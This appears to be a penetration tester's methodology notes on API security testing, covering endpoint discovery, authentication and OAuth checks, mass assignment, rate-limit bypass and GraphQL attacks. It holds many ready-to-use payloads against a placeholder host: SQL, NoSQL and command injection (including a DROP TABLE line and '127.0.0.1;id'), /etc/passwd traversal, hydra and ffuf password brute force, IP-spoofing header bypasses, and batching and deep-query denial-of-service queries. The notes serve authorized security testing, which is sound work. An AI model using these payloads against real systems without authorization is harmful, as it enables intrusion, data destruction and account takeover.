# API Testing Complete

## Overview

API testing focuses on identifying security vulnerabilities in REST, GraphQL, and other API architectures. Modern web applications rely heavily on APIs for client-server communication, making them a high-value target.

**Key Distinction:** Unlike traditional web app testing, APIs often lack the visual feedback of rendered pages, requiring deeper understanding of request/response structures, data formats, and state management.

---

## REST API Discovery

The first step in API testing is discovering all available endpoints and understanding the API surface.

### Endpoint Fuzzing

```bash
# Common API base paths to fuzz
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Version enumeration
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://target.com/api/v2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt

# Recursive discovery
ffuf -u http://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -recursion -recursion-depth 2

# HTTP method fuzzing
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method http://target.com/api/users -w "\nHTTP: %{http_code}\n"
done
```

### Kiterunner

Kiterunner is specifically designed for API route discovery using wordlists of real-world API paths.

```bash
# Basic scan
kiterunner http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt

# With thread count
kiterunner http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -t 50

# Output to file
kiterunner http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -o api_routes.txt

# Scan with extensions
kiterunner http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -x php,json,asp

# Using Kiterunner's built-in wordlist
kr scan http://target.com -w /usr/share/wordlists/apitools/kiterunner/routes-large.kite
```

### Arjun (Parameter Discovery)

Arjun specializes in finding HTTP parameters.

```bash
# Basic parameter discovery
arjun -u http://target.com/api/endpoint

# Custom wordlist
arjun -u http://target.com/api/endpoint -w /path/to/wordlist.txt

# With headers (authentication)
arjun -u http://target.com/api/endpoint -H "Authorization: Bearer <token>"

# Post method
arjun -u http://target.com/api/endpoint -m POST

# Timeout and stability
arjun -u http://target.com/api/endpoint -t 20 --stable

# Multiple targets
arjun -i targets.txt
```

### Finding API Documentation

```bash
# Common documentation paths
/api/docs
/api/swagger
/api/swagger.json
/api/swagger.yaml
/swagger
/swagger-ui/
/swagger-resources
/api/doc
/api/v1/doc
/api/v2/doc
/api/documentation
/api/help
/.well-known/openapi.json
/openapi.json
/api/schema
/graphql?query={__schema{types{name}}}

# Swagger/OpenAPI specific
curl http://target.com/swagger.json | jq .
curl http://target.com/api/swagger/v1/swagger.json | jq .

# Check response headers
curl -v http://target.com/api 2>&1 | grep -i "api\|swagger\|openapi"

# View source for JS references
curl http://target.com/main.js | grep -oP 'api/[a-zA-Z0-9_/?=&]+' | sort -u

# Check robots.txt
curl http://target.com/robots.txt

# Check sitemap
curl http://target.com/sitemap.xml
```

### API Recon Wordlists

```bash
# Common API wordlist locations
/usr/share/seclists/Discovery/Web-Content/api/
/usr/share/wordlists/apitools/
/usr/share/wordlists/amass/
/usr/share/dirb/wordlists/

# Best files for API discovery
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/seclists/Discovery/Web-Content/api/objects.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## API Authentication Testing

### Token-Based Auth

```bash
# Test missing token
curl http://target.com/api/users
# Expect: 401 Unauthorized

# Test invalid token
curl -H "Authorization: Bearer invalid_token_here" http://target.com/api/users
# Expect: 401 Unauthorized or 403 Forbidden

# Test expired token
curl -H "Authorization: Bearer <expired_jwt>" http://target.com/api/users

# Test token in URL
curl http://target.com/api/users?access_token=<token>

# Test token in cookie
curl -b "token=<value>" http://target.com/api/users

# Test token switching
# Capture token of user A, use for user B
# Capture token of low-priv user, try admin endpoints

# Test token scoping
# Token for /api/users should not work for /api/admin/users
```

### API Key Testing

```bash
# Test without key
curl http://target.com/api/resource

# Test with invalid key
curl http://target.com/api/resource?api_key=invalid
curl -H "X-API-Key: invalid" http://target.com/api/resource
curl -H "X-Api-Key: invalid" http://target.com/api/resource
curl -H "api-key: invalid" http://target.com/api/resource

# Check for hardcoded keys in:
# - JavaScript files
# - Mobile app decompiled code
# - Public GitHub repos
# - Forums / Stack Overflow

# Test key in different locations
# Query param, header, cookie, request body
```

### OAuth 2.0 Testing

```bash
# Test scope escalation
# Capture a token with limited scope
# Try to access resources requiring a wider scope

# Test token reuse across clients
# Access token for client A used against client B's API

# Test refresh token
# Replay refresh token after invalidation
# Check if refresh token can generate tokens with different scopes

# Check for PKCE
# Implicit grant without PKCE is vulnerable to interception
```

### Basic Auth Testing

```bash
# Base64 decode
echo "Basic YWRtaW46cGFzc3dvcmQ=" | base64 -d
# Output: admin:password

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 443 http-get://target.com/api/admin

# Test with no auth
curl http://target.com/api/admin
```

---

## API Parameter Tampering

### HTTP Method Manipulation

```bash
# Test HTTP method override
curl -X GET http://target.com/api/users
curl -X POST http://target.com/api/users
curl -X PUT http://target.com/api/users
curl -X DELETE http://target.com/api/users
curl -X PATCH http://target.com/api/users
curl -X OPTIONS http://target.com/api/users
curl -X HEAD http://target.com/api/users

# Method override headers
curl -H "X-HTTP-Method-Override: DELETE" http://target.com/api/users
curl -H "X-HTTP-Method-Override: PUT" http://target.com/api/users/1
curl -H "X-Method-Override: DELETE" http://target.com/api/users
curl -H "X-HTTP-Method: DELETE" http://target.com/api/users

# HTTP method tunnelling
curl -X POST -H "X-HTTP-Method-Override: DELETE" http://target.com/api/users/1
```

### Parameter Pollution

```bash
# Duplicate parameters - different frameworks handle differently
GET /api/users?id=1&id=2
GET /api/users?role=user&role=admin

# URL encoded vs JSON parameter conflict
POST /api/update
Content-Type: application/x-www-form-urlencoded
role=user&role=admin

POST /api/update
Content-Type: application/json
{"role": "user"}
{"role": "admin"}

# Array-based pollution
GET /api/users?role[]=user&role[]=admin

# Nested parameter pollution
GET /api/update?user[id]=1&user[role]=admin
```

### Boundary Testing

```bash
# Integer overflow
GET /api/users?id=-1
GET /api/users?id=999999999999999999999
GET /api/users?id=0
GET /api/users?id=1.5
GET /api/users?id=a

# String boundary
GET /api/users?name=
GET /api/users?name=a
GET /api/users?name=<script>alert(1)</script>
GET /api/users?name=" OR "1"="1
GET /api/users?name=../../etc/passwd

# Array boundary
POST /api/users
Content-Type: application/json
{"tags": []}
{"tags": [""]}
{"tags": ["a", "b", "c", ... 10000 times]}
```

### Injection in Parameters

```bash
# SQL injection in API params
GET /api/users?id=1 UNION SELECT * FROM users
GET /api/users?sort=id; DROP TABLE users--
GET /api/users?filter=(id=1 OR 1=1)

# Command injection
GET /api/exec?cmd=ls
GET /api/ping?host=127.0.0.1;id
GET /api/download?file=../../../etc/passwd

# NoSQL injection
POST /api/login
Content-Type: application/json
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# LDAP injection
GET /api/users?filter=(uid=*)(cn=admin*)

# XPath injection
GET /api/users?query=//user[role='admin']
```

---

## Mass Assignment

Mass assignment (also called autobinding) occurs when an API binds user-supplied input to internal object properties without proper filtering.

### Testing Mass Assignment

```bash
# 1. Create a user normally
POST /api/users
{"username": "test", "password": "test123", "email": "test@test.com"}

# 2. Try adding extra properties
POST /api/users
{"username": "test", "password": "test123", "role": "admin", "isAdmin": true}

POST /api/users
{
  "username": "test",
  "password": "test123",
  "role_id": 1,
  "is_active": true,
  "verified": true,
  "account_balance": 999999,
  "credit": 999999,
  "admin": true
}

# 3. Check update endpoints (PATCH/PUT)
PATCH /api/users/1
{"role": "admin", "is_admin": true, "user_level": 9}
```

### Common Mass Assignment Properties

```bash
# Roles and permissions
role, roles, user_role, is_admin, is_superuser, admin, user_type, account_type, permission_level, access_level, group_id, groups

# Account state
verified, email_verified, is_verified, active, is_active, enabled, disabled, banned, suspended, approved

# Financial
balance, credit, account_balance, points, tokens, wallet

# Metadata
id, user_id, uid, _id, created_by, updated_by, owner_id

# Configuration
settings, preferences, config, flags, features
```

### GraphQL Mass Assignment

```graphql
# Mutation with extra fields
mutation {
  createUser(input: {
    username: "test"
    password: "test123"
    role: "admin"      # extra field
    isAdmin: true       # extra field
  }) {
    id
    username
    role
  }
}
```

---

## Rate Limiting Testing

Rate limiting prevents brute force and DoS attacks. Absent or weak rate limiting is a vulnerability.

### Testing Methodology

```bash
# 1. Send rapid requests and track responses
for i in $(seq 1 100); do
  curl -s -w "\nRequest $i: HTTP %{http_code}\n" \
    -X POST http://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"test"}' \
    | tail -1
done

# 2. Check for rate limit headers
curl -v http://target.com/api/users 2>&1 | grep -i "rate\|limit\|retry\|429\|throttle"

# 3. Test different bypass methods (below)
```

### Rate Limit Bypass Techniques

```bash
# IP spoofing headers
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/login
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/login
curl -H "X-Real-IP: 1.2.3.6" http://target.com/api/login
curl -H "X-Forwarded-Host: 1.2.3.7" http://target.com/api/login
curl -H "Client-IP: 1.2.3.8" http://target.com/api/login
curl -H "X-Client-IP: 1.2.3.9" http://target.com/api/login

# Rotate through IPs
for ip in $(seq 1 100); do
  curl -H "X-Forwarded-For: 192.168.1.$ip" \
    -X POST http://target.com/api/login \
    -d "username=admin&password=test$ip"
done

# Slow loris technique (slow requests)
# Send headers one by one to keep connection open
# Bypasses rate limits based on request count

# Login using different parameters
# Test if rate limit is per-username or per-IP
# If per-username: rotate usernames
# If per-IP: use X-Forwarded-For bypass

# Use different endpoints that authenticate
/login, /auth, /api/login, /api/v1/login, /api/authenticate

# Use different HTTP methods
POST /api/login
PUT /api/login
PATCH /api/login
```

### Rate Limit Checklist

- [ ] Unauthenticated endpoint (login, register, password reset)
- [ ] Authenticated API calls
- [ ] OTP/2FA endpoints
- [ ] Password change endpoint
- [ ] Account recovery
- [ ] Search endpoints (data scraping)
- [ ] Bulk operations
- [ ] File upload endpoints
- [ ] GraphQL queries

---

## GraphQL Introspection and Injection

GraphQL is common and introduces unique attack surface.

### Introspection Queries

```bash
# Full schema introspection
curl http://target.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Get all types
curl http://target.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name kind description}}}"}'

# Get fields for a specific type
curl http://target.com/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__type(name: \"User\"){name fields{name type{name kind}}}}"}'

# Check if introspection is enabled (if it returns schema data, it's enabled)
# If disabled, the endpoint may return an error or empty response

# Disable introspection in production (recommended)
# Security: introspection reveals the entire data schema
```

### InQL (GraphQL Testing Tool)

```bash
# Generate queries from schema
python3 inql -t http://target.com/graphql

# Generate queries with headers
python3 inql -t http://target.com/graphql -H "Authorization: Bearer <token>"

# Save output to file
python3 inql -t http://target.com/graphql -o graphql_queries/

# Use generated queries for batch testing
```

### GraphQL Injection

```graphql
# SQL injection through GraphQL
query {
  users(filter: "1' OR '1'='1") {
    id
    username
    email
  }
}

# NoSQL injection in GraphQL
query {
  login(input: {
    username: "admin"
    password: {"$gt": ""}
  }) {
    token
    user {
      id
      role
    }
  }
}

# Command injection
query {
  runCommand(cmd: "ls -la")
}

# Path traversal
query {
  readFile(path: "../../../etc/passwd")
}
```

### GraphQL Batching & Depth Attacks

```graphql
# Batching attack (bypass rate limiting by batching queries)
# Instead of 1 request per auth attempt, batch many
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
  # ... 100+ queries in one request
]

# Deep query DoS (recursive queries)
query {
  user(id: 1) {
    friends {
      user {
        friends {
          user {
            friends {
              user {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

---

## API Versioning Vulnerabilities

### Common Versioning Issues

**1. Deprecated endpoints still active**

```bash
# Old v1 may have fewer security controls
GET /api/v1/users
GET /api/v2/users  # New version with auth

# Compare responses
curl -v http://target.com/api/v1/users
curl -v -H "Authorization: Bearer <token>" http://target.com/api/v2/users
```

**2. Version differences in access control**

```bash
# Test same endpoint across versions
curl -v -X DELETE http://target.com/api/v1/users/1  # May not check permissions
curl -v -X DELETE http://target.com/api/v2/users/1  # Properly authenticated
```

**3. Version handling via headers**

```bash
# Test different version specification methods
curl -H "Accept: application/vnd.target.v1+json" http://target.com/api/users
curl -H "Accept: application/vnd.target.v2+json" http://target.com/api/users
curl -H "API-Version: 1" http://target.com/api/users
curl -H "API-Version: 2" http://target.com/api/users
curl -H "X-API-Version: 1" http://target.com/api/users
```

**4. Internal vs. external version**

```bash
# Some APIs expose different behavior for internal consumers
curl http://target.com/api/v1/users
curl http://target.com/api/internal/users  # May skip authentication
curl -H "X-Internal: true" http://target.com/api/users
```

---

## API Security Testing Checklist

### Authentication
- [ ] Test missing auth tokens
- [ ] Test expired tokens
- [ ] Test invalid tokens
- [ ] Test token switching (horizontal privilege escalation)
- [ ] Test token scoping
- [ ] Test API key exposure
- [ ] Test OAuth scope escalation
- [ ] Test JWT attacks (see [[Authentication Bypass Complete]])

### Authorization
- [ ] Test IDOR (vertical and horizontal)
- [ ] Test HTTP method overrides
- [ ] Test BOLA (Broken Object Level Authorization)
- [ ] Test mass assignment
- [ ] Test admin endpoints with user token
- [ ] Test user endpoints with other user ID

### Input Validation
- [ ] Test parameter pollution
- [ ] Test boundary values
- [ ] Test injection (SQL, NoSQL, command, LDAP, XPath)
- [ ] Test unicode/encoding bypasses
- [ ] Test file upload restrictions
- [ ] Test content-type switching (JSON vs. XML vs. URL-encoded)

### Rate Limiting
- [ ] Test unauthenticated brute force protection
- [ ] Test authenticated operation limits
- [ ] Test GraphQL query batching
- [ ] Test IP spoofing bypasses
- [ ] Test concurrent request limits

### Information Disclosure
- [ ] Check error messages for stack traces
- [ ] Check for detailed error codes
- [ ] Check for schema exposure
- [ ] Check response headers for server info
- [ ] Check for version disclosure
- [ ] Check for user enumeration via different responses
- [ ] Check for verbose error messages in GraphQL

### Transport Security
- [ ] Check if HTTPS is enforced
- [ ] Check if HTTP downgrade is possible
- [ ] Check TLS version (1.2 min)
- [ ] Check for weak cipher suites
- [ ] Check certificate validity

### Business Logic
- [ ] Test mass assignment
- [ ] Test parameter tampering for pricing
- [ ] Test workflow bypass
- [ ] Test race conditions
- [ ] Test state manipulation
- [ ] Test idempotency keys

---

## Tools Reference

### Burp Suite

```bash
# Proxy setup
# Proxy -> Options -> Add listener (127.0.0.1:8080)

# Repeater for manual testing
# Send request -> Modify -> Send

# Intruder for fuzzing
# Attack types:
# - Sniper: one payload position, try each value one at a time
# - Battering ram: same payload in all positions
# - Pitchfork: parallel wordlists, pairs from each
# - Cluster bomb: cartesian product of all wordlists

# Extensions for API testing:
# - JSON Web Tokens (JWT Editor)
# - GraphQL Raider
# - Autorize (authorization testing)
# - AutoRepeater (mass testing)
# - Turbo Intruder (fast brute force)
```

### Postman

```bash
# Environment management
# Set base_url, token, etc. as variables

# Collection runner
# Run all requests in a collection sequentially
# Useful for sequence/state-dependent tests

# Pre-request scripts (JS)
pm.environment.set("timestamp", Date.now());
pm.request.headers.add({
    key: "Authorization",
    value: "Bearer " + pm.environment.get("token")
});

# Tests (JS)
pm.test("Status 200", () => pm.response.to.have.status(200));
pm.test("Response time < 200ms", () => pm.expect(pm.response.responseTime).to.be.below(200));
```

### ffuf

```bash
# API endpoint discovery
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all

# Parameter fuzzing
ffuf -u http://target.com/api/users?FUZZ=test -w params.txt

# POST body fuzzing
ffuf -u http://target.com/api/login -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"FUZZ"}' -w /usr/share/wordlists/rockyou.txt -fc 401

# Header fuzzing
ffuf -u http://target.com/api/admin -H "FUZZ: value" -w /usr/share/seclists/Miscellaneous/http-request-headers/http_request_headers.txt -fc 403,401

# Recursive discovery
ffuf -u http://target.com/FUZZ -w endpoints.txt -recursion -recursion-depth 3
```

### Kiterunner

```bash
# Full API scan
kr scan http://target.com -w /usr/share/wordlists/apitools/kiterunner/routes-large.kite

# With verbose output
kr scan http://target.com -w /usr/share/wordlists/apitools/kiterunner/routes-large.kite -v

# Specific status code filtering
kr scan http://target.com -w routes.kite -s 200,401,403,500
```

### Arjun

```bash
# Quick scan
arjun -u http://target.com/api/endpoint

# With delay to avoid rate limiting
arjun -u http://target.com/api/endpoint -d 2

# JSON-based API
arjun -u http://target.com/api/data -m POST -H "Content-Type: application/json"
```

---

## Common API Vulnerabilities by Industry

| Industry | Common API Vulnerabilities |
|----------|--------------------------|
| E-commerce | Mass assignment (pricing), IDOR (orders), rate limiting (coupon) |
| Banking/Fintech | IDOR (accounts), parameter tampering (amounts), replay attacks |
| Healthcare | IDOR (patient records), mass assignment, weak auth |
| Social Media | Rate limiting (scraping), IDOR (profiles/messages), data exposure |
| IoT | Weak auth, lack of encryption, firmware OTA manipulation |
| SaaS | Tenant isolation (IDOR), API key exposure, mass assignment |

---

## Related Notes

- [[03 - Web Application Hacking/3.1 Information Gathering/Web Reconnaissance]] — recon before API testing
- [[03 - Web Application Hacking/3.8 Authentication Bypass/Authentication Bypass Complete]] — auth bypass techniques
- [[03 - Web Application Hacking/3.11 Common Vulnerabilities/Common Web Vulns]] — web-specific vulnerabilities
- [[02 - Vulnerability Assessment/Vulnerability Assessment Notes]] — vulnerability assessment
- [[13 - Report Writing/Penetration Test Report Template]] — reporting findings
